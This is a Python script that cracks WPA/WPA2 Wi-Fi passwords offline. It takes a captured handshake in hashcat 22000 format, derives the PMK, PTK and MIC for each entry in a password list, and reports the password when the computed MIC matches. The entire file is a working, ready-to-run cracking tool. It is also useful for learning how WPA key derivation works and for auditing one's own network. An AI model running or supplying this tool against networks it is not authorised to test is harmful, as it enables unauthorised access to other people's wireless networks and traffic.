import hashlib, hmac, sys, struct

# Default Values
hashline = None
passlist_src="passlist.txt"

# Pull values from hashline if given (hc22000)
if len(sys.argv) > 1: 
    hashline=sys.argv[1]
    hl = hashline.split("*")
    mic = bytes.fromhex(hl[2])
    mac_ap = bytes.fromhex(hl[3])
    mac_cl = bytes.fromhex(hl[4])
    essid = bytes.fromhex(hl[5])
    nonce_ap = bytes.fromhex(hl[6])
    nonce_cl = bytes.fromhex(hl[7][34:98])           # Client Nonce is part of EAPoL Client
    eapol_client = bytes.fromhex(hl[7])
if len(sys.argv) > 2: passlist_src=sys.argv[2]

# Read passlist.txt into a python list
with open(passlist_src, 'r') as f:
    passlist = f.read().splitlines()

def crack_handshake(mic, mac_ap, mac_cl, essid, nonce_ap, nonce_cl, eapol_client):
    print('\033[95m')
    print("MIC:                      ", mic.hex())
    print("SSID:                     ", essid.decode())
    print("AP MAC Address:           ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_ap))
    print("Client MAC Address:       ", "%02x:%02x:%02x:%02x:%02x:%02x" % struct.unpack("BBBBBB", mac_cl))
    print("AP Nonce:                 ", nonce_ap.hex())
    print("Client Nonce:             ", nonce_cl.hex())
    print("\nEAPoL Client:           ", "\n" + eapol_client.hex())
    print('\x1b[0m')

    proceed = input("Attempt crack with these settings? (y/n): ")
    if proceed in ["y", ""]: pass 
    else: return
    print('\033[1m' + '\33[33m' + "Attempting to crack password...\n" + '\x1b[0m')

    # Set order of byte strings (min, max)
    def min_max(a, b):
        if len(a) != len(b): raise 'Unequal byte string lengths' 
        for entry in list(zip( list(bytes(a)), list(bytes(b)) )):
            if entry[0] < entry[1]: return (a, b)
            elif entry[1] < entry[0]: return (b, a)
        return (a, b)

    macs = min_max(mac_ap, mac_cl)
    nonces = min_max(nonce_ap, nonce_cl)
    ptk_inputs = b''.join([b'Pairwise key expansion\x00', 
                        macs[0], macs[1], nonces[0], nonces[1], b'\x00'])

    for password in passlist:
        password = password.encode()
        pmk = hashlib.pbkdf2_hmac('sha1', password, essid, 4096, 32)
        ptk = hmac.new(pmk, ptk_inputs, hashlib.sha1).digest()
        try_mic = hmac.new(ptk[:16], eapol_client, hashlib.sha1).digest()[:16]

        if (try_mic == mic):
            print('\033[92m' + try_mic.hex(), "- Matches captured MIC\n")
            print("Password Cracked!\n" + '\x1b[0m')
            print("SSID:             ", essid.decode())
            print("Password:         ", password.decode(), "\n")
            return
        print(try_mic.hex())

    print('\033[91m' + "\nFailed to crack password. " + 
        "It may help to try a different passwords list. " + '\x1b[0m' + "\n")
    
if len(sys.argv) > 1: 
    crack_handshake(mic, mac_ap, mac_cl, essid, nonce_ap, nonce_cl, eapol_client)